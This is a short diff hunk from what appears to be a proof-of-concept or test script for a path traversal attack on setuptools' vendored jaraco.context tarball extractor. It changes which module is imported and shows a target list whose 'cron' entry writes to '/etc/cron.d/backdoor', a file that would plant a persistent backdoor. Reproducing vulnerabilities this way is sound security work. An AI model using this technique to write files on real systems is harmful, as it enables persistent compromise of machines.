@@ -47,8 +47,8 @@ def wait_for_server(host, port, timeout=30):
 
 def run_attack(scenario):
     """Execute the tarball path traversal attack."""
-    # Import here to use the installed setuptools
-    from jaraco.context import tarball
+    # Import from setuptools' vendored jaraco.context
+    from setuptools._vendor.jaraco.context import tarball
 
     targets = {
         'cron': '/etc/cron.d/backdoor',
